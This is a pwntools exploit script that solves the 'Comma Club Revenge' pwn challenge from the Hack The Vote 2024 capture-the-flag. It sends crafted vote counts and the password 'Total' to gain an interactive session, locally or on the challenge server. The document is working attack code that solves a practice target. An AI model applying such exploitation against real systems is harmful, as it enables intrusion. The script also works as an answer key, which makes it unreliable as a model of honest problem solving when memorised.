#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/Hack The Vote 2024/pwn/Comma Club Revenge/challenge')
elf = ELF(TARGET)

def add_votes_menu(r, value):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', str(value).encode())
    r.sendlineafter(b'> ', b'3')

def print_status(r):
    r.sendlineafter(b'> ', b'2')

def close_voting(r, password):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', password)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)
    [add_votes_menu(r, 400003) for i in range(3)]
    print_status(r)
    close_voting(r, b'Total')

    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('comma-club-revenge.chal.hackthe.vote', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
